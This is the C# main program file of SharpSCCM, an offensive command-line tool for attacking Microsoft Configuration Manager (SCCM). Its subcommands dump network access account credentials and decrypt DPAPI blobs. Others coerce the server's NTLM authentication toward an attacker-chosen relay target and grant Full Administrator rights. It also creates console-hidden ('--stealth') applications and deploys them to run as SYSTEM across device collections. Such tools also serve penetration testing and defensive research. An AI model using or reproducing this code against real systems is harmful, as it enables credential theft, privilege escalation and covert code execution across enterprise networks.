using System;
using System.CommandLine;
using System.CommandLine.Builder;
using System.CommandLine.Parsing;
using System.CommandLine.NamingConventionBinder;
using System.Management;
using System.Reflection;
using Microsoft.ConfigurationManagement.Messaging.Framework;

namespace SharpSCCM
{
     static class Program
    {
        static void Main(string[] args)
        {
            // Gather required arguments
            var rootCommand = new RootCommand("Interact with Microsoft Endpoint Configuration Manager");
            rootCommand.Add(new Argument<string>("server", "The FQDN or NetBIOS name of the Configuration Manager server to connect to"));
            rootCommand.Add(new Argument<string>("sitecode", "The site code of the Configuration Manager server (e.g., PS1)"));

            //
            // Subcommands
            //

            // add
            var addCommand = new Command("add", "A group of commands that add objects to other objects (e.g., add device to collection)");
            rootCommand.Add(addCommand);

            // add device-to-collection
            var addDeviceToCollection = new Command("device-to-collection", "Add a device to a collection for application deployment");
            addCommand.Add(addDeviceToCollection);
            addDeviceToCollection.Add(new Argument<string>("device-name", "The name of the device you would like to add to the specified collection"));
            addDeviceToCollection.Add(new Argument<string>("collection-name", "The name of the collection you would like to add the specified device to"));
            addDeviceToCollection.Handler = CommandHandler.Create(
                (string server, string sitecode, string deviceName, string collectionName) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    MgmtPointWmi.AddDeviceToCollection(sccmConnection, deviceName, collectionName);
                });

            // add user-to-collection
            var addUserToCollection = new Command("user-to-collection", "Add a user to a collection for application deployment");
            addCommand.Add(addUserToCollection);
            addUserToCollection.Add(new Argument<string>("user-name", "The domain and user name you would like to add to the specified collection (e.g., DOMAIN-SHORTNAME\\USERNAME)"));
            addUserToCollection.Add(new Argument<string>("collection-name", "The name of the collection you would like to add the specified user to"));
            addUserToCollection.Handler = CommandHandler.Create(
                (string server, string sitecode, string userName, string collectionName) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    MgmtPointWmi.AddUserToCollection(sccmConnection, userName, collectionName);
                });

            // add user-to-admins
            var addUserToAdmins = new Command("user-to-admins", "Add a user to the RBAC_Admins table to obtain Full Administrator access to ConfigMgr console and WMI objects. This command requires local Administrator privileges on the server running the site database.");
            addCommand.Add(addUserToAdmins);
            addUserToAdmins.Add(new Argument<string>("user-name", "The domain and user name you would like to grant Full Administrator privilege to (e.g., DOMAIN-SHORTNAME\\USERNAME)"));
            //addUserToAdmins.Handler = CommandHandler.Create(
            //    (string server, string sitecode, string userName) =>
            //    {
            //        var connection = Database.Connect(server, sitecode);
            //        Database.Query(connection, "SELECT * FROM RBAC_Admins");
            //    });

            // get 
            var getCommand = new Command("get", "A group of commands that query certain objects and display their contents");
            rootCommand.Add(getCommand);
            getCommand.AddGlobalOption(new Option<bool>(new[] { "--count", "-c" }, "Returns the number of rows that match the specified criteria"));
            getCommand.AddGlobalOption(new Option<bool>(new[] { "--dry-run", "-d" }, "Display the resulting WQL query but do not connect to the specified server and execute it"));
            getCommand.AddGlobalOption(new Option<string>(new[] { "--order-by", "-o" }, "An ORDER BY clause to set the order of data returned by the query (e.g., \"ResourceID DESC\"). Defaults to ascending (ASC) order."));
            getCommand.AddGlobalOption(new Option<string[]>(new[] { "--properties", "-p" }, "A space-separated list of properties to query (e.g., \"IsActive UniqueUserName\". Always includes key properties.") { Arity = ArgumentArity.OneOrMore });
            Option whereOption = new Option<string>(new[] { "--where", "-w" }, "A WHERE condition to narrow the scope of data returned by the query (e.g., \"Name='cave.johnson'\" or \"Name LIKE '%cave%'\")");
            whereOption.Name = "whereCondition";
            // Using reflection to alias the "where" option to "whereCondition"
            typeof(Option).GetMethod("RemoveAlias", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(whereOption, new object[] { whereOption.Name });
            getCommand.AddGlobalOption(whereOption);
            getCommand.AddGlobalOption(new Option<bool>(new[] { "--verbose", "-v" }, "Display all class properties and their values (default: false)"));

            // get application
            var getApplication = new Command("application", "Get information on applications");
            getCommand.Add(getApplication);
            getApplication.Add(new Option<string>(new[] { "--name", "-n" }, "A string to search for in application names (returns all applications where the name contains the provided string"));
            getApplication.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, bool dryRun, string orderBy, string[] properties, string whereCondition, bool verbose, string name) =>
                {
                    if (!string.IsNullOrEmpty(name))
                    {
                        whereCondition = $"LocalizedDisplayName='{name}'";
                    }
                    if (properties.Length == 0 && !verbose)
                    {
                        properties = new[] { "CI_ID", "CI_UniqueID", "CreatedBy", "DateCreated", "ExecutionContext", "DateLastModified", "IsDeployed", "IsEnabled", "IsHidden", "LastModifiedBy", "LocalizedDisplayName", "NumberOfDevicesWithApp", "NumberOfDevicesWithFailure", "NumberOfUsersWithApp", "NumberOfUsersWithFailure", "SourceSite" };
                    }
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    MgmtUtil.GetClassInstances(sccmConnection, "SMS_Application", count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // get classes
            var getClasses = new Command("classes", "Get information on remote WMI classes");
            getCommand.Add(getClasses);
            getClasses.Add(new Argument<string>("wmiPath", "The WMI path to query (e.g., \"root\\CCM\")"));
            getClasses.Handler = CommandHandler.Create(
                (string server, string wmiPath, bool count, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\" + wmiPath);
                    MgmtUtil.GetClasses(sccmConnection);
                });

            // get class-instances
            var getClassInstances = new Command("class-instances", "Get information on WMI class instances");
            getCommand.Add(getClassInstances);
            getClassInstances.Add(new Argument<string>("wmiClass", "The WMI class to query (e.g., \"SMS_R_System\")"));
            getClassInstances.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, string wmiClass, string[] properties, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    if (properties.Length == 0)
                    {
                        verbose = true;
                    }
                    MgmtUtil.GetClassInstances(sccmConnection, wmiClass, count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // get class-properties
            var getClassProperties = new Command("class-properties", "Get all properties of a specified WMI class");
            getCommand.Add(getClassProperties);
            getClassProperties.Add(new Argument<string>("wmiClass", "The WMI class to query (e.g., \"SMS_R_System\")"));
            getClassProperties.Handler = CommandHandler.Create(
                (string server, string sitecode, string wmiClass) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    ManagementObject classInstance = new ManagementClass(sccmConnection, new ManagementPath(wmiClass), new ObjectGetOptions()).CreateInstance();
                    MgmtUtil.GetClassProperties(classInstance);
                });

            // get collection
            var getCollection = new Command("collection", "Get information on collections");
            getCommand.Add(getCollection);
            getCollection.Add(new Option<string>(new[] { "--name", "-n" }, "A string to search for in collection names (returns all devices where the device name contains the provided string"));
            getCollection.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, bool dryRun, string orderBy, string[] properties, string whereCondition, bool verbose, string name) =>
                {
                    if (!string.IsNullOrEmpty(name))
                    {
                        whereCondition = "Name LIKE '%" + name + "%'";
                    }
                    if (properties.Length == 0 && !verbose)
                    {
                        properties = new[] { "CollectionID", "CollectionType", "IsBuiltIn", "LastMemberChangeTime", "LastRefreshTime", "LimitToCollectionName", "MemberClassName", "MemberCount", "Name" };
                    }
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    MgmtUtil.GetClassInstances(sccmConnection, "SMS_Collection", count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // get collection-member
            var getCollectionMember = new Command("collection-member", "Get the members of a specified collection");
            getCommand.Add(getCollectionMember);
            getCollectionMember.Add(new Argument<string>("name", "A string to search for in collection names (returns all members of collections with names containing the provided string"));
            getCollectionMember.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, string[] properties, string whereCondition, string orderBy, bool dryRun, bool verbose, string name) =>
                {
                    if (properties.Length == 0 && !verbose)
                    {
                        properties = new[] { "Collection", "CollectionID", "Domain", "IsActive", "IsAssigned", "IsClient", "Name", "SiteCode" };
                    }
                    if (count || !string.IsNullOrEmpty(orderBy))
                    {
                        Console.WriteLine("[!] Error: COUNT and ORDER BY don't seem to work when querying SMS_CollectionMember_a");
                    }
                    else
                    {
                        ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                        MgmtPointWmi.GetCollectionMember(sccmConnection, name, count, properties, orderBy, dryRun, verbose);
                    }
                });

            // get deployment
            var getDeployment = new Command("deployment", "Get information on deployments");
            getCommand.Add(getDeployment);
            getDeployment.Add(new Option<string>(new[] { "--name", "-n" }, "A string to search for in deployment names (returns all deployments where the name contains the provided string"));
            getDeployment.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, string[] properties, string whereCondition, string orderBy, bool dryRun, bool verbose, string name) =>
                {
                    if (!string.IsNullOrEmpty(name))
                    {
                        whereCondition = "AssignmentName LIKE '%" + name + "%'";
                    }
                    if (properties.Length == 0 && !verbose)
                    {
                        properties = new[] { "ApplicationName", "AssignedCI_UniqueID", "AssignedCIs", "AssignmentName", "CollectionName", "Enabled", "EnforcementDeadline", "LastModificationTime", "LastModifiedBy", "NotifyUser", "SourceSite", "TargetCollectionID", "UserUIExperience" };
                    }
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    MgmtUtil.GetClassInstances(sccmConnection, "SMS_ApplicationAssignment", count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // get device
            var getDevice = new Command("device", "Get information on devices");
            getCommand.Add(getDevice);
            getDevice.Add(new Option<string>(new[] { "--last-user", "-u" }, "Get information on devices where a specific user was the last to log in (matches exact string provided). Note: This reflects the last user logon at the point in time the last heartbeat DDR and hardware inventory was sent to the management point and may not be accurate."));
            getDevice.Add(new Option<string>(new[] { "--name", "-n" }, "A string to search for in device names (returns all devices where the device name contains the provided string"));
            getDevice.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, bool dryRun, string orderBy, string[] properties, string whereCondition, bool verbose, string lastUser, string name) =>
                {
                    if (!string.IsNullOrEmpty(lastUser))
                    {
                        whereCondition = "LastLogonUserName='" + lastUser + "'";
                    }
                    else if (!string.IsNullOrEmpty(name))
                    {
                        whereCondition = "Name LIKE '%" + name + "%'";
                    }
                    if (properties.Length == 0 && !verbose)
                    {
                        properties = new[] { "Active", "ADSiteName", "Client", "DistinguishedName", "FullDomainName", "HardwareID", "IPAddresses", "IPSubnets", "IPv6Addresses", "IPv6Prefixes", "IsVirtualMachine", "LastLogontimeStamp", "LastLogonUserDomain", "LastLogonUserName", "MACAddresses", "Name", "NetbiosName", "Obsolete", "OperatingSystemNameandVersion", "PrimaryGroupID", "ResourceDomainORWorkgroup", "ResourceNames", "SID", "SMSInstalledSites", "SMSUniqueIdentifier", "SNMPCommunityName", "SystemContainerName", "SystemGroupName", "SystemOUName" };
                    }
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    MgmtUtil.GetClassInstances(sccmConnection, "SMS_R_System", count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // get naa
            var getNetworkAccessAccounts = new Command("naa", "Get network access accounts and passwords from the server policy");
            getCommand.Add(getNetworkAccessAccounts);
            getNetworkAccessAccounts.Handler = CommandHandler.Create(
                (string server, string sitecode) =>
                {
                    MgmtPointMessaging.GetNetworkAccessAccounts(server, sitecode);
                }
                );

            // get primary-user
            var getPrimaryUser = new Command("primary-user", "Get information on primary users set for devices");
            getCommand.Add(getPrimaryUser);
            getPrimaryUser.Add(new Option<string>(new[] { "--device", "-d" }, "A specific device to search for (returns the device matching the exact string provided)"));
            getPrimaryUser.Add(new Option<string>(new[] { "--user", "-u" }, "A specific user to search for (returns all devices where the primary user name contains the provided string)"));
            getPrimaryUser.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, string[] properties, string whereCondition, string orderBy, bool dryRun, bool verbose, string device, string user) =>
                {
                    if (!string.IsNullOrEmpty(device))
                    {
                        whereCondition = "ResourceName='" + device + "'";
                    }
                    else if (!string.IsNullOrEmpty(user))
                    {
                        whereCondition = "UniqueUserName LIKE '%" + user + "%'";
                    }
                    if (properties.Length == 0)
                    {
                        verbose = true;
                    }
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    MgmtUtil.GetClassInstances(sccmConnection, "SMS_UserMachineRelationShip", count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // get site-push-settings
            var getSitePushSettings = new Command("site-push-settings", "Query the specified management point for automatic client push installation settings (requires Full Administrator access)");
            getCommand.Add(getSitePushSettings);
            getSitePushSettings.Handler = CommandHandler.Create(
                (string server, string sitecode) =>
                {
                    MgmtPointWmi.GetSitePushSettings(server, sitecode);
                });

            // invoke
            var invokeCommand = new Command("invoke", "A group of commands that execute actions on the server");
            rootCommand.Add(invokeCommand);

            // invoke client-push
            var invokeClientPush = new Command("client-push", "Coerce the server to authenticate to an arbitrary destination via NTLM (if enabled) by registering a new device and sending a heartbeat data discovery record (DDR) with the ClientInstalled flag set to false. This command does not require local Administrator privileges but must be run from a client device. This command can also be run as an SCCM Administrator with the '--as-admin' option to use built-in functionality to initiate client push installation rather than registering a new client device.");
            invokeCommand.Add(invokeClientPush);
            invokeClientPush.Add(new Option<bool>(new[] { "--as-admin", "-a" }, "Use this option if you are in a user context with Administrator privileges to manage SCCM."));
            invokeClientPush.Add(new Option<string>(new[] { "--target", "-t" }, "The NetBIOS name, IP address, or if WebClient is enabled on the site server, the IP address and port (e.g., 192.168.1.1@8080) of the relay/capture server. The server will attempt to authenticate to the ADMIN$ share on this target. If left blank, NTLM authentication attempts will be sent to the machine running SharpSCCM."));
            invokeClientPush.Handler = CommandHandler.Create(
                (string server, string sitecode, bool asAdmin, string target) =>
                {
                    if (!asAdmin)
                    {
                        MessageCertificateX509 certificate = MgmtPointMessaging.CreateUserCertificate();
                        SmsClientId clientId = MgmtPointMessaging.RegisterClient(certificate, target, server, sitecode);
                        MgmtPointMessaging.SendDDR(certificate, target, server, sitecode, clientId);
                    }
                    else
                    {
                        MgmtPointWmi.GenerateCCR(server, sitecode, target);
                    }

                });

            // invoke query
            var invokeQuery = new Command("query", "Execute a given WQL query");
            invokeCommand.Add(invokeQuery);
            invokeQuery.Add(new Argument<string>("query", "The WQL query to execute"));
            invokeQuery.Handler = CommandHandler.Create(
                (string server, string sitecode, string query) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    MgmtUtil.InvokeQuery(sccmConnection, query);
                });

            // invoke update
            var invokeUpdate = new Command("update", "Force all members of a specified collection to check for updates and execute any new applications that are available");
            invokeCommand.Add(invokeUpdate);
            invokeUpdate.Add(new Argument<string>("collection", "The name of the collection to force to update"));
            invokeUpdate.Handler = CommandHandler.Create(
                (string server, string sitecode, string collection) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    MgmtPointWmi.InvokeUpdate(sccmConnection, collection);
                });

            // local
            var localCommand = new Command("local", "A group of commands to interact with the local workstation/server");
            rootCommand.Add(localCommand);

            // local class-instances
            var localClassInstances = new Command("class-instances", "Get information on local WMI class instances");
            localCommand.Add(localClassInstances);
            localClassInstances.Add(new Argument<string>("wmiClass", "The WMI class to query (e.g., \"SMS_Authority\")"));
            localClassInstances.Handler = CommandHandler.Create(
                (bool count, string wmiClass, string[] properties, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\localhost\\root\\ccm");
                    if (properties.Length == 0)
                    {
                        verbose = true;
                    }
                    MgmtUtil.GetClassInstances(sccmConnection, wmiClass, count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // local class-properties
            var localClassProperties = new Command("class-properties", "Get all properties of a specified WMI class");
            localCommand.Add(localClassProperties);
            localClassProperties.Add(new Argument<string>("wmiClass", "The WMI class to query (e.g., \"SMS_R_System\")"));
            localClassProperties.Handler = CommandHandler.Create(
                (string wmiClass) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\localhost\\root\\ccm");
                    ManagementObject classInstance = new ManagementClass(sccmConnection, new ManagementPath(wmiClass), new ObjectGetOptions()).CreateInstance();
                    MgmtUtil.GetClassProperties(classInstance);
                });

            // local clientinfo
            var getLocalClientInfo = new Command("clientinfo", "Get the primary MgmtUtil Point and Site Code for the local host");
            localCommand.Add(getLocalClientInfo);
            getLocalClientInfo.Handler = CommandHandler.Create(
                new Action(() =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\localhost\\root\\ccm");
                    MgmtUtil.GetClassInstances(sccmConnection, "CCM_InstalledComponent", false, new[] { "Version" }, "Name='SmsClient'");
                }));

            // local create-ccr
            var localCreateCCR = new Command("create-ccr", "Create a CCR that initiates client push installation to a specified target (requires local Administrator privileges on a management point, only works on ConfigMgr 2003 and 2007)");
            localCommand.Add(localCreateCCR);
            localCreateCCR.Add(new Argument<string>("target", "The NetBIOS name, IP address, or if WebClient is enabled on the site server, the IP address and port (e.g., 192.168.1.1@8080) of the relay/capture server. The server will attempt to authenticate to the ADMIN$ share on this target."));
            localCreateCCR.Handler = CommandHandler.Create(
                (string target) =>
                {
                    string[] lines = { "[NT Client Configuration Request]", $"Machine Name={target}" };
                    System.IO.File.WriteAllLines("C:\\Program Files\\Microsoft Configuration Manager\\inboxes\\ccr.box\\test.ccr", lines);
                });

            // local push-logs
            var localPushLogs = new Command("push-logs", "Search for evidence of client push installation");
            localCommand.Add(localPushLogs);
            localPushLogs.Handler = CommandHandler.Create(
                new Action(() =>
                {
                    //LocalPushLogs();
                }));

            // local grep
            var localGrep = new Command("grep", "Search a specified file for a specified string");
            localCommand.Add(localGrep);
            localGrep.Add(new Argument<string>("path", "The full path to the file (e.g., \"C:\\Windows\\ccmsetup\\Logs\\ccmsetup.log"));
            localGrep.Add(new Argument<string>("string-to-find", "The string to search for"));
            localGrep.Handler = CommandHandler.Create(
                (string path, string stringToFind) =>
                    ClientFileSystem.LocalGrepFile(path, stringToFind)
                );

            // local naa
            var getLocalNetworkAccessAccounts = new Command("naa", "Get any network access accounts for the site using WMI (requires admin privileges)");
            localCommand.Add(getLocalNetworkAccessAccounts);
            getLocalNetworkAccessAccounts.Add(new Argument<string>("method", "The method of obtaining the DPAPI blob: WMI or Disk"));
            getLocalNetworkAccessAccounts.Add(new Option<string>(new[] { "--masterkey", "-m" }, "The {GUID}:SHA1 DPAPI SYSTEM masterkey"));
            getLocalNetworkAccessAccounts.Handler = CommandHandler.Create(
                (string method, string masterkey) =>
                {
                    if ((method == "wmi") && (masterkey != null))
                    {
                        Credentials.LocalNetworkAccessAccountsWmi(masterkey);
                    }
                    else if ((method == "disk") && (masterkey != null))
                    {
                        Credentials.LocalNetworkAccessAccountsDisk(masterkey);
                    }
                    else
                    {
                        Console.WriteLine("[X] A method (wmi or disk) and masterkey are required!");
                    }
                });

            // local siteinfo
            var localSiteInfo = new Command("siteinfo", "Get the primary MgmtUtil Point and Site Code for the local host");
            localCommand.Add(localSiteInfo);
            localSiteInfo.Handler = CommandHandler.Create(
                new Action(() =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\localhost\\root\\ccm");
                    MgmtUtil.GetClassInstances(sccmConnection, "SMS_Authority", false, new[] { "CurrentManagementPoint", "Name" });
                }));

            // local classes
            var localClasses = new Command("classes", "Get information on local WMI classes");
            localCommand.Add(localClasses);
            localClasses.Add(new Argument<string>("wmiPath", "The WMI path to query (e.g., \"root\\ccm\")"));
            localClasses.Handler = CommandHandler.Create(
                (string wmiPath, bool count, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\localhost\\" + wmiPath);
                    MgmtUtil.GetClasses(sccmConnection);
                });

            // new
            var newCommand = new Command("new", "A group of commands that create new objects on the server");
            rootCommand.Add(newCommand);

            // new application
            var newApplication = new Command("application", "Create an application");
            newCommand.Add(newApplication);
            newApplication.Add(new Argument<string>("name", "The name you would like your application to be called"));
            newApplication.Add(new Argument<string>("path", "The local or UNC path of the binary/script the application will execute (e.g., \"C:\\Windows\\System32\\calc.exe\", \"\\\\site-server.domain.com\\Sources$\\my.exe"));
            newApplication.Add(new Option<bool>(new[] { "--run-as-user", "-r" }, "Run the application in the context of the logged on user (default: SYSTEM)"));
            newApplication.Add(new Option<bool>(new[] { "--stealth", "-s" }, "Hide the application from the Configuration Manager console"));
            newApplication.Handler = CommandHandler.Create(
                (string server, string sitecode, string name, string path, bool runAsUser, bool stealth) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    MgmtPointWmi.NewApplication(sccmConnection, name, path, runAsUser, stealth);
                });

            // new collection
            var newCollection = new Command("collection", "Create a collection of devices or users");
            newCommand.Add(newCollection);
            // newCollection.Add(new Argument<string>("collection-type", "The type of collection to create, 'device' or 'user'").FromAmong(new string[] { "device", "user" }));
            newCollection.Add(new Argument<string>("collection-type", "The type of collection to create, 'device' or 'user'"));
            newCollection.Add(new Argument<string>("collection-name", "The name you would like your collection to be called"));
            newCollection.Handler = CommandHandler.Create(
                (string server, string sitecode, string collectionType, string collectionName) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    MgmtPointWmi.NewCollection(sccmConnection, collectionType, collectionName);
                });

            // new deployment
            var newDeployment = new Command("deployment", "Create an assignment to deploy an application to a collection");
            newCommand.Add(newDeployment);
            newDeployment.Add(new Argument<string>("application", "The name of the application you would like to deploy"));
            newDeployment.Add(new Argument<string>("collection", "The name of the collection you would like to deploy the application to"));
            newDeployment.Handler = CommandHandler.Create(
                (string server, string sitecode, string name, string application, string collection) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    MgmtPointWmi.NewDeployment(sccmConnection, application, collection);
                });

            // remove
            var removeCommand = new Command("remove", "A group of commands that deletes objects from the server");
            rootCommand.Add(removeCommand);

            // remove application
            var removeApplication = new Command("application", "Delete a specified application");
            removeCommand.Add(removeApplication);
            removeApplication.Add(new Argument<string>("name", "The exact name (LocalizedDisplayName) of the application to delete"));
            removeApplication.Handler = CommandHandler.Create(
                (string server, string sitecode, string name) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    Cleanup.RemoveApplication(sccmConnection, name);
                });

            // remove collection
            var removeCollection = new Command("collection", "Delete a specified collection");
            removeCommand.Add(removeCollection);
            removeCollection.Add(new Argument<string>("name", "The exact name (Name) of the collection to delete. All collections with this exact name will be deleted."));
            removeCollection.Handler = CommandHandler.Create(
                (string server, string sitecode, string name) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    Cleanup.RemoveCollection(sccmConnection, name);
                });

            // remove deployment
            var removeDeployment = new Command("deployment", "Delete a deployment of a specified application to a specified collection");
            removeCommand.Add(removeDeployment);
            removeDeployment.Add(new Argument<string>("application", "The exact name (ApplicationName) of the application deployed"));
            removeDeployment.Add(new Argument<string>("collection", "The exact name (CollectionName) of the collection the application was deployed to"));
            removeDeployment.Handler = CommandHandler.Create(
                (string server, string sitecode, string application, string collection) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    Cleanup.RemoveDeployment(sccmConnection, application, collection);
                });

            // remove device
            var removeDevice = new Command("device", "Remove a device from SCCM");
            removeCommand.Add(removeDevice);
            removeDevice.Add(new Argument<string>("guid", "The GUID of the device to remove (e.g., \"GUID:AB424B0D-F582-4020-AA26-71D32EA07683\""));
            removeDevice.Handler = CommandHandler.Create(
                (string server, string sitecode, string guid) =>
                {
                    ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    Cleanup.RemoveDevice(sccmConnection, guid);
                });

            // Execute
            var commandLine = new CommandLineBuilder(rootCommand).UseDefaults().Build();
            commandLine.Invoke(args);

            if (System.Diagnostics.Debugger.IsAttached) Console.ReadLine();
        }
    }
}